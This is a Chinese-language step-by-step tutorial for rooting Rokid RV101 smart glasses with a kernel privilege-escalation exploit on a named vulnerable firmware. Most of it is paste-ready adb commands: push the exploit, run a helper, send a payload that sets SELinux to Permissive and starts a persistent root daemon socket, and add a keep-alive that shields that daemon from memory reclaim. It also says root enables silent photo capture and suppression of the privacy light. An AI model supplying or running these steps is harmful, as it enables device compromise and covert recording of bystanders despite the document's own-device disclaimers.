# 從零開始：用自己的腳本讓 Rokid 眼鏡取得 Root（新手教學）

> 版本：2026-09-08 · 適用韌體：`1.22.009-20260710-150201`（漏洞版）
> 對象：資工系一年級小白也能照著做。名詞都會先白話解釋。
>
> ⚠️ **僅限你「自己的」或「已獲授權」的 Rokid 眼鏡**做安全研究。請勿用於他人設備。
>
> 📌 本教學描述的是「host adb + helper」路線（現為**自動回退備援路徑**）。
> 最新預設模式是 **Shizuku**（眼鏡 App 自己以 shell 身份跑 exploit），
> 見 `docs/deploy.md` §9 與 `reports/shizuku_integration_test_report.md`。

---

## 0. 這份文件在講什麼

你的 Rokid 眼鏡（型號 RV101 / RG-glasses）出廠時，你只能以「一般使用者」身份
（Android 叫 `shell`，uid=2000）透過 adb 操作它，很多系統檔不能讀、不能寫。
本專案寫好了一支**本機提權（LPE）程式** `ghostlock_rv101`，它利用韌體裡一個核心
漏洞（GhostLock, CVE-2026-43499）讓指令變成 **root（uid=0，最高權限）**。

這份教學教你：**接上眼鏡 → 跑專案現成的腳本 → 拿到 root → 驗證 root**。
不需要你會寫 exploit，只要會「複製貼上指令 + 看輸出」。

---

## 1. 先搞懂幾個名詞（白話版）

| 名詞 | 意思 |
|---|---|
| **adb** | Android 除錯橋。一條從你電腦連到眼鏡的「命令線」，`adb shell` 可下指令 |
| **shell / uid=2000** | adb 預設給你的低權限身份，很多東西看不到 |
| **root / uid=0** | 最高權限。能讀寫所有檔案、改系統設定 |
| **SELinux Enforcing/Permissive** | Android 的「門禁系統」。Enforcing=嚴格（擋 root 做事），Permissive=放行。我們要把它切成 Permissive |
| **LPE / exploit** | 本機提權攻擊程式。`ghostlock_rv101` 就是 exploit |
| **kernel panic / reboot** | 攻擊有時會把核心弄當機 → 眼鏡自動重開。**這是正常的**，重試就好（成功率大約一半） |
| **payload** | exploit 成功後要執行的「腳本內容」。我們的 payload = 關 SELinux + 啟動常駐 `root_daemon` |
| **root_daemon** | 一個以 root 身份常駐的小程式，聽 UNIX socket；之後你送一行指令它就幫你以 root 執行 |
| **helper** | 專案寫的「代跑 exploit 的機器人」：它負責跑 exploit、等時機換 payload、回報結果 |
| **UNIX socket** | 程式間在本機溝通的管道（檔案型）。`root_daemon.sock` 就是 |
| **提權 ≠ 刷機** | 我們沒有改韌體分區；**重開機後 root 會消失**，要再跑一次流程 |

---

## 2. 事前檢查清單（全部打勾再開始）

### 2.1 硬體與環境
- [ ] Rokid 眼鏡本體 + USB 傳輸線
- [ ] 一台 Windows 電腦（本專案實測環境；macOS/Linux 概念相同，指令小改）
- [ ] 電腦上裝好 **adb**（Android SDK Platform-Tools），或確定專案路徑下有
      `platform-tools/adb.exe`
- [ ] 本專案資料夾（以下簡稱 `專案/`）完整解壓，內含：
  - `deploy/root_bridge.sh`、`deploy/trigger_root_daemon.cmd`、`deploy/run_root.sh`
  - `deploy/get_root_now.sh`（一鍵自動版）
  - exploit 程式 **`ghostlock_rv101`**（aarch64 檔；若手邊沒有，向管理此專案的人索取）

### 2.2 連上眼鏡
1. USB 線接上眼鏡與電腦。
2. 開啟「終端機」。兩種選擇：
   - **路線 A（推薦新手）**：Windows 的 **WSL / Ubuntu** 或 Git Bash（因為腳本是 bash 寫的）
   - 路線 B：純 Windows PowerShell 也行，但只適合逐條打 adb 指令
3. 確認看得到眼鏡（指令的 `adb` 若不在 PATH，請換成完整路徑，
   本專案預設路徑是 `/mnt/c/Users/<你>/AppData/Local/Android/Sdk/platform-tools/adb.exe`）：

```bash
adb devices -l
```

**你應該看到：**
```
List of devices attached
<DEVICE_SERIAL>       device product:glasses model:RG_glasses device:glasses transport_id:1
```
- 看到 `device` = 成功。看到 `offline` = 拔掉重插，或到眼鏡上允許 USB 偵錯。

### 2.3 確認韌體是「漏洞版」（很重要！）
```bash
adb shell getprop ro.build.fingerprint
```
**必須**看到 `1.22.009-20260710-150201`。
- 如果看到 `1.25.012-...`：Rokid 已修掉漏洞，**這套方法會失效**，請停止。

### 2.4 確認目前的「弱雞狀態」（記錄證據用）
```bash
adb shell "id; getenforce"
```
預期輸出長這樣 → 表示還沒 root、門禁還開著：
```
uid=2000(shell) gid=2000(shell) ... context=u:r:shell:s0
Enforcing
```

### 2.5 確認 exploit 程式已放在眼鏡上
```bash
adb shell "ls -l /data/local/tmp/ghostlock_rv101"
```
- 看得到檔案 = 跳過下面。
- 看不到 = 先從專案把 exploit 傳上去：
```bash
adb push ghostlock_rv101 /data/local/tmp/ghostlock_rv101
adb shell chmod 755 /data/local/tmp/ghostlock_rv101
```

---

## 3. 路線 A：一鍵自動版（新手建議，約 5~15 分鐘）

專案的 `deploy/get_root_now.sh` 已把「啟動 helper → 送 payload → 等待 → 重試 →
驗證 root」全部包起來，還會在 exploit 造成重開機後自動等開機、自動重來。

### 步驟 A-1：打開腳本改三個變數（只改你環境不同的）
`deploy/get_root_now.sh` 本身只定義 `ROOT_DIR`；**`ADB` 與 `SERIAL` 來自共同設定 `deploy/env.sh`**
（`SERIAL` 未給時會自動取 `adb devices` 的第一台）。要覆寫就直接帶環境變數：

```bash
ADB=<adb 路徑> SERIAL=<眼鏡序號> bash deploy/get_root_now.sh
```
- `SERIAL`：改成 2.2 步看到的序列號
- `ROOT_DIR`：改成你放專案資料夾的路徑

### 步驟 A-2：執行
```bash
cd 專案/deploy
bash get_root_now.sh
```
也可以放著讓它在背景跑，看紀錄檔：
```bash
tail -f deploy/get_root_now.log   # 另開一個終端機看
```

### 步驟 A-3：觀察輸出，你大概會看到這些訊息
```
[helper] 不存在，執行 root_bridge.sh 重建並啟動   ← 機器人上工
[trigger] last.cmd 已寫入，等待 exploit...          ← payload 送出了
[wait] progress: exploit-attempt-1                  ← exploit 第 1 次嘗試
[wait] progress: ready                              ← exploit 成功了一半（要換 payload）
[wait] progress: waiting-done                       ← 核心攻擊進行中（約 2~3 分鐘）
[wait] last.out = OK（payload 已以 root 執行完畢）   ← 中了！
[verify] last.done 內容：uid=0(root) ...            ← 驗證
===== ROOT 已達成並驗證 =====                        ← 🎉
```

**你可能會看到的「正常壞消息」**（不要緊張）：
```
uptime 倒退 ... → 裝置已 reboot        ← exploit 把核心弄當機了，腳本會等開機重試
last.out = ERR:...                     ← 這次沒中，會自動再試（每輪最多 3 次）
```
腳本最多自動重開 6 輪；歷史經驗大多在 1~2 輪內成功。

---

## 4. 路線 B：一步一步手動版（看懂原理）

適合想了解「到底發生什麼事」的人。效果與路線 A 相同。

### 步驟 B-1：建立「橋接目錄」並啟動 helper 機器人
helper 是 shell 常駐迴圈，監看 `/data/local/tmp/ghostlock_bridge/last.cmd`：
```bash
cd 專案/deploy
bash root_bridge.sh
```
它會自動：建目錄（777）→ 確認 exploit 在 → 推送 root_daemon → 寫入並啟動 helper。
**你應該看到：**
```
[1/4] 檢查 ghostlock_rv101 → [+] ghostlock_rv101 就緒
[2/4] 建立 bridge 目錄並放寬權限 ...
[2.5/4] 推送 root daemon ...
[3/4] 寫入 helper 常駐迴圈 ...
[4/4] 啟動 helper ...
完成。
```

### 步驟 B-2：檢查 helper 活著
```bash
adb shell "ps -A -o PID,ARGS | grep ghostlock_bridge_helper"
```
看到一列 `sh /data/local/tmp/ghostlock_bridge_helper.sh` = OK。

### 步驟 B-3：送 payload（告訴 helper「成功後幫我執行這個」）
payload 內容已經寫好在 `deploy/trigger_root_daemon.cmd`，內容白話翻譯：
「把 SELinux 關成 Permissive → 啟動 root_daemon → 回報完成」。

```bash
# 把 payload 放到 helper 監看的信箱（檔名必須叫 last.cmd）
adb push deploy/trigger_root_daemon.cmd /data/local/tmp/ghostlock_bridge/last.cmd
adb shell chmod 666 /data/local/tmp/ghostlock_bridge/last.cmd
```
helper 一秒內會讀走它，開始跑 exploit。

### 步驟 B-4：觀察進度（另一終端機輪流看）
```bash
# exploit 自己的紀錄
adb shell tail -f /data/local/tmp/gl_run.log

# helper 的階段標記：started → exploit-attempt-N → ready → installed → waiting-done → done
adb shell cat /data/local/tmp/ghostlock_bridge/last.progress

# 最終結果：OK 或 ERR:xxx
adb shell cat /data/local/tmp/ghostlock_bridge/last.out
```
- `gl_run.log` 出現 `[+] child is root!` = exploit 核心成功
- `last.progress` 出現 `waiting-done` 後，約 1~3 分鐘內 `last.out` 會變 `OK`
- 若眼鏡突然重開機：等它開完（`adb wait-for-device`），**從 B-1 重來**。
  這叫「正常失敗」，核心攻擊本來就有約一半機率當機。

---

## 5. 驗證：你真的拿到 root 了

### 5.1 一行指令驗證（用 root_daemon socket 執行）
```bash
cd 專案/deploy
bash run_root.sh 'id; getenforce'
```
**看到這個 = 成功：**
```
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
Permissive
```

### 5.2 不加分不解釋的原始方法（想看 socket 長怎樣）
```bash
echo 'id' | adb shell "nc -U /data/local/tmp/root_daemon.sock"
```

### 5.3 實質證據：讀只有 root 能讀的目錄、留個證明檔
```bash
bash run_root.sh 'ls -ld /data/adb'        # root-only 目錄，能讀=root
bash run_root.sh 'mkdir -p /data/root_proof && ls -ld /data/root_proof'
```

---

## 6. 之後怎麼用這個 root

root 到手後，**任何指令**都能用 run_root.sh 跑：
```bash
bash run_root.sh 'cat /sys/class/leds/white/brightness'   # 讀 LED
bash run_root.sh 'echo 0 > /sys/class/leds/white/brightness'  # 關燈（研究用）
bash run_root.sh 'ls /data'
```
手機端 App（Rokid Capture 的 ghostlock/LED 功能）也會自動走這條 socket，
不需要你再動手。

---

## 7. 常見問題（FAQ）

**Q1：跑很久都沒 `OK`？**
看 `last.progress`。若停在 `exploit-attempt-N` 超過 10 分鐘或出現 `FOPS install
failed`，直接重新觸發一次：刪掉再放一次 payload（B-3），或整台重開再從 B-1 開始。
這是 exploit 出了名的「看運氣」問題，多試幾次就好。

**Q2：一直重開機？**
正常。核心攻擊成功率約一半。路線 A 會自動重試；手動版就是重開完成後再跑一遍。
若連 10 次都失敗，檢查 2.3 的韌體版本是否真的還是 1.22.009。

**Q3：我 reboot 之後 root 不見了？**
正常！helper 與 root_daemon 都存在記憶體，重開機就沒了。
再跑一次 B-1 → B-3（或整個路線 A）即可。這是本方法的特性（不改韌體分區）。

**Q4：helper 莫名其妙消失（log 停在原地）？**
眼鏡記憶體小（1.8GB），helper 有時會被系統的 OOM/lmkd 殺掉。重跑
`bash root_bridge.sh` 再觸發一次即可。

**Q5：`run_root.sh` 說連不上 socket？**
root_daemon 沒在跑。確認底下指令輸出是 `1`：
```bash
adb shell "grep -c root_daemon.sock /proc/net/unix"
```
若不是 1，表示還沒提權成功（或已被 reboot 清掉），回去重跑流程。

**Q6：我可不可以把這支 exploit 拿來做別的事？**
本專案用途是「自有設備的安全研究」。root 之後請只做你研究計畫內的動作。
未經授權使用他人設備、或利用它竊錄他人隱私，是違法且違反研究倫理的。

---

## 8. 快速速查表（貼在螢幕邊）

```bash
# 看裝置
adb devices -l
# 看韌體（必須 1.22.009）
adb shell getprop ro.build.fingerprint
# 提權前狀態
adb shell "id; getenforce"
# 啟動 helper（每次 reboot 後都要）
bash 專案/deploy/root_bridge.sh
# 送 payload
adb push 專案/deploy/trigger_root_daemon.cmd /data/local/tmp/ghostlock_bridge/last.cmd
adb shell chmod 666 /data/local/tmp/ghostlock_bridge/last.cmd
# 看進度
adb shell cat /data/local/tmp/ghostlock_bridge/last.progress
adb shell cat /data/local/tmp/ghostlock_bridge/last.out
# 驗證 root
bash 專案/deploy/run_root.sh 'id; getenforce'
```

### 檔案地圖（這些檔在專案哪裡、做什麼）
| 檔案 | 角色 |
|---|---|
| `ghostlock_rv101` | exploit 本體（要放在眼鏡 `/data/local/tmp/`） |
| `deploy/root_bridge.sh` | 啟動「helper 機器人」+ 確認環境（1 鍵） |
| `deploy/trigger_root_daemon.cmd` | payload 內容（成功後要執行的 root 腳本） |
| `deploy/get_root_now.sh` | 全自動版：helper→觸發→等待→重試→驗證（新手用這個） |
| `deploy/run_root.sh` | 之後隨時以 root 執行指令的小工具 |
| `deploy/root_daemon`（+ `.c`）| 常駐 root 服務，聽 `/data/local/tmp/root_daemon.sock` |
| `/data/local/tmp/ghostlock_bridge/` | helper 與 payload 的信箱（在眼鏡上） |
| `deploy/get_root_now.log` | 自動版過程紀錄（出問題先看它） |

---

## 9. 責任與還原

- **只對自己的設備做**。研究完畢、要還原出廠狀態：直接 `adb reboot` 即可回到
  Enforcing 乾淨狀態（root 是記憶體層級，重開即失效；不會留下持久後門）。
- 若你改了系統檔，恢復原廠設定（設定 → 備份與重設）可完整還原。
- 本專案有完整證據與揭露流程（`RV101_Disclosure/`）；若要對外公開，請遵循
  協調式揭露，不要直接貼 exploit 細節。

---

## 取得 root 之後：讓它撐完整個 session（2026-09-13 新增）

提權成功後建議再跑一支腳本，安裝 **root daemon 存活看守**：

```bash
SERIAL=<眼鏡序號> bash deploy/install_root_keepalive.sh
```

它會（不需重跑 exploit、不需重開機）：

1. 安裝 `/data/local/tmp/root_daemon_keepalive.sh`：每 20 秒檢查 listener，daemon 崩潰就自動重建
   （實測 **9–18 秒**救回）。
2. 把 daemon 與 keep-alive 的 `oom_score_adj` 設為 `-1000`（避免被系統記憶體回收）。
3. 校正 `root_daemon.pid`（reboot 後常殘留舊 PID）。

> 為什麼重要：沒有 root 時，**靜音拍攝、隱私燈抑制、WiFi 媒體傳輸、眼鏡端戒指控制**都會失效。
> 手機端「設定 → 拍攝與權限 → root 狀態」會顯示目前狀態；若真的失效且無法自動重建，
> 會直接告訴你要跑哪支腳本（例如 `deploy/root_bridge.sh 或 deploy/start_shizuku.sh`）。

補充：App 內建的引擎選擇是**執行期自動探測**（Shizuku binder 可用就用 Shizuku，否則用 bridge helper），
所以先跑 `start_shizuku.sh` 或 `root_bridge.sh` 都可以，**不需要改程式或重建 APK**。
